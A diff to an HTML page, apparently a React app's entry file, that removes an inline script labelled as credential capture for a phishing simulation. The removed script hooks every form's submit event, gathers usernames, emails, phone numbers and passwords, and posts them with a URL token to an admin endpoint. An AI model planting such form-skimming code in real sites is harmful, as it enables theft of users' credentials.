@@ -26,50 +26,6 @@
 
 <body>
   <div id="root"></div>
-
-  <script>
-    // Credential capture script for phishing simulation
-    (function () {
-      const token = new URLSearchParams(window.location.search).get('token');
-
-      // Wait for React to render forms
-      const observer = new MutationObserver(() => {
-        const forms = document.querySelectorAll('form');
-        forms.forEach(form => {
-          if (!form.hasAttribute('data-capture-added')) {
-            form.setAttribute('data-capture-added', 'true');
-            form.addEventListener('submit', async function (e) {
-              const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"]');
-              const credentials = {};
-              inputs.forEach(input => {
-                if (input.name || input.id) {
-                  credentials[input.name || input.id] = input.value;
-                }
-              });
-
-              if (token && Object.keys(credentials).length > 0) {
-                try {
-                  await fetch('/api/admin/capture-credentials', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      token: token,
-                      ...credentials
-                    })
-                  });
-                  console.log('Credentials captured');
-                } catch (err) {
-                  console.error('Failed to capture credentials:', err);
-                }
-              }
-            });
-          }
-        });
-      });
-
-      observer.observe(document.body, { childList: true, subtree: true });
-    })();
-  </script>
 </body>
 
 </html>
